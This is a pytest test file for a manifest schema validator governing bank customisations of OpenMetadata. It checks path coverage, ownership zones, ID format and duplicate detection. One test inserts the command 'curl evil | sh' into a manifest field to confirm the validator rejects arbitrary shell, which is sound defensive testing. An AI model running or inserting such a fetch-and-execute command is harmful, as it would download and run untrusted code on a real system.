"""T10 manifest schema + semantic-validator tests.

Paths are real OpenMetadata 1.12.13 source paths (verified against the mirror).
"""
import copy
from pathlib import Path

import pytest

from acgh import layout as L
from acgh import manifest as M

_LAYOUT = Path(__file__).resolve().parents[1] / "policies" / "repository-layout.yaml"

_AUTH = (
    "openmetadata-service/src/main/java/org/openmetadata/service/"
    "security/AuthLoginServlet.java"
)


def layout():
    return L.load_layout(_LAYOUT)


def good_core_patch():
    return {
        "schema_version": 1,
        "customization_id": "BANK-OM-001",
        "kind": "core-patch",
        "title": "SSO login servlet hook",
        "implementation": {
            "allowed_changed_paths": [
                "openmetadata-service/src/main/java/org/openmetadata/"
                "service/security/**"
            ],
            "required_changed_paths": [_AUTH],
        },
        "upgrade_watch": {
            "paths": ["openmetadata-spec/src/main/resources/json/schema/auth/**"],
            "configuration_keys": ["authenticationConfiguration.provider"],
        },
        "assurance": {
            "contracts": ["CONTRACT-SSO-LOGIN"],
            "direct_tests": ["tests/bank/test_login_hook.py::test_hook"],
        },
    }


def test_valid_core_patch_passes():
    M.validate_manifest(good_core_patch(), layout())


def test_required_not_subset_of_allowed_fails():
    m = good_core_patch()
    m["implementation"]["allowed_changed_paths"] = ["ingestion/**"]
    with pytest.raises(M.ManifestError, match="not covered by allowed"):
        M.validate_manifest(m, layout())


def test_required_glob_rejected():
    m = good_core_patch()
    m["implementation"]["required_changed_paths"] = [
        "openmetadata-service/src/main/java/org/openmetadata/service/security/**"
    ]
    with pytest.raises(M.ManifestError, match="literal"):
        M.validate_manifest(m, layout())


def test_core_patch_without_required_fails():
    m = good_core_patch()
    m["implementation"]["required_changed_paths"] = []
    with pytest.raises(M.ManifestError, match="at least one required"):
        M.validate_manifest(m, layout())


def test_ownership_mismatch_fails():
    # A core-patch whose required path lives in the governance zone is wrong.
    m = good_core_patch()
    m["implementation"]["allowed_changed_paths"] = [".bank/**"]
    m["implementation"]["required_changed_paths"] = [".bank/policy/x.yaml"]
    with pytest.raises(M.ManifestError, match="owned by"):
        M.validate_manifest(m, layout())


def test_verification_command_field_rejected_P0_8():
    # No arbitrary shell may enter through the manifest.
    m = good_core_patch()
    m["verification"] = {"command": "curl evil | sh"}
    with pytest.raises(M.ManifestError, match="schema"):
        M.validate_manifest(m, layout())


def test_assurance_overlap_rejected():
    m = good_core_patch()
    m["assurance"]["direct_tests"] = ["CONTRACT-SSO-LOGIN"]
    with pytest.raises(M.ManifestError, match="overlap"):
        M.validate_manifest(m, layout())


def test_bad_id_pattern_rejected():
    m = good_core_patch()
    m["customization_id"] = "OM-1"
    with pytest.raises(M.ManifestError, match="schema"):
        M.validate_manifest(m, layout())


def test_duplicate_id_in_set_rejected():
    a = good_core_patch()
    b = copy.deepcopy(good_core_patch())  # same id BANK-OM-001
    with pytest.raises(M.ManifestError, match="duplicate customization_id"):
        M.validate_manifest_set([("a.yaml", a), ("b.yaml", b)], layout())


def test_extension_kind_allows_extension_paths():
    m = {
        "schema_version": 1,
        "customization_id": "BANK-OM-050",
        "kind": "extension",
        "implementation": {
            "allowed_changed_paths": ["bank-extensions/**"],
            "required_changed_paths": ["bank-extensions/sso/Provider.java"],
        },
    }
    M.validate_manifest(m, layout())
